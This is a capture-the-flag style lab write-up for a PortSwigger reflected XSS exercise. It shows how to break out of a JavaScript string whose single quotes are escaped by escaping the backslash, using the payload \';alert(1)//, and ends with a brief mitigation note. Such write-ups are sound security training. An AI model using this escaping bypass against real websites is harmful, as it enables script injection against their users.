# Lab20 - Reflected XSS Into A JavaScript String With Single Quotes Escaped

## Objective

Exploit reflected XSS where:

```javascript
'
```

is escaped.

Execute:

```javascript
alert(1)
```

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Reflected XSS |
| Difficulty | Practitioner |
| Context | JavaScript String |
| Platform | PortSwigger |

---

# Vulnerability Overview

Input appears inside:

```javascript
var searchTerms='USER_INPUT';
```

and single quotes are escaped.

---

# Analysis

## Step 1

Search:

```javascript
'
```

---

Observed:

```javascript
\'
```

---

## Step 2

Inspect full reflection.

Application:

```javascript
var searchTerms='USER_INPUT';
```

---

## Step 3

Need To Escape Escape Character

Goal:

```text
Break Out Of Escaping
        ↓
Terminate String
        ↓
Execute JavaScript
```

---

# Full Payload(s) Used

```javascript
\';alert(1)//
```

---

# Why The Payload Works

Application transforms:

```javascript
'
```

into:

```javascript
\'
```

---

Payload:

```javascript
\';alert(1)//
```

becomes:

```javascript
\\';alert(1)//
```

---

Execution Flow

```text
Escape Backslash
        ↓
String Terminates
        ↓
alert(1)
        ↓
Comment Remaining Code
```

---

# Personal Analysis & Testing Process

## Initial Problem

Single quote escaped.

---

## Key Realization

Can escape:

```javascript
\
```

itself.

---

## Payload

```javascript
\';alert(1)//
```

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Use proper JavaScript encoding.

Avoid manual escaping.

---

# Related Theory

- 27-breaking-out-of-a-javascript-string.md

---

# Key Learnings

- Backslashes frequently introduce bypass opportunities.
- Escaping one character is rarely sufficient.
- Always inspect actual browser output.